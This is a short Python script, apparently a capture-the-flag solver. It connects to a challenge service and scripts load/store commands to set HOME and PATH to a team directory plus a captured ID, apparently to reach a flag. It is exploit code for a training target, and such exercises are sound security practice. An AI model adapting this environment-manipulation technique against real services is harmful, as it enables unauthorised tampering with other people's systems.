import socket
from sys import argv
from pwn import *
import os

def whattheenv(IPaddr, port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((IPaddr, int(port)))
	
	#os.environ["HOME"] = "/"	
	#print os.environ["HOME"]
	count = 0
	ID = ""
	#print os.environ['HOME']
	while 1:
		#count = 0
		print count
		output = s.recv(1024)
		
		#print ID
		if "ID" in output: 
			print output
			#pos = output.find("id")
			data = output[-9:]
			ID += data
		elif "load" in output:
			print output
			#if count == 0 or count == 1:
			if count == 0:
				count += 1
				print "load"
				s.sendall("load"+'\n')
			elif count == 1:
				count += 1
				print "load"
				s.sendall("load"+'\n')
			elif count == 2:
				print "store"
				count += 1
				s.sendall("store"+'\n')
			
			elif count == 3:
				print "store"
				count += 1
				s.sendall("store"+'\n')
			#elif count == 4:
			#	s.sendall("quit"+'\n')	
		elif "variable" in output:
			print output
			if count == 1:
				print "HOME"
				s.sendall("HOME"+'\n')
			elif count == 2:
				print "PATH"
				s.sendall("PATH"+'\n')
			elif count == 3:
				print "PATH"
				s.sendall("HOME"+'\n')
			elif count == 4:
				s.sendall("HOME"+'\n')
		elif "value" in output:
			print output
			if count == 1:
				print ID
				s.sendall("/home/team23/"+ID+'\n')
			elif count == 2:
				print ID
				s.sendall("/home/team23/"+ID+'\n')
			elif count == 3:
				s.sendall("/home/team23/"+ID+'\n')	
		elif "Unknown" in output:
			count = count - 1
		#elif "FLAG" in output:
		#	print output
		#	break
		elif not output:
			break
		else:
			print output

whattheenv(argv[1], argv[2])

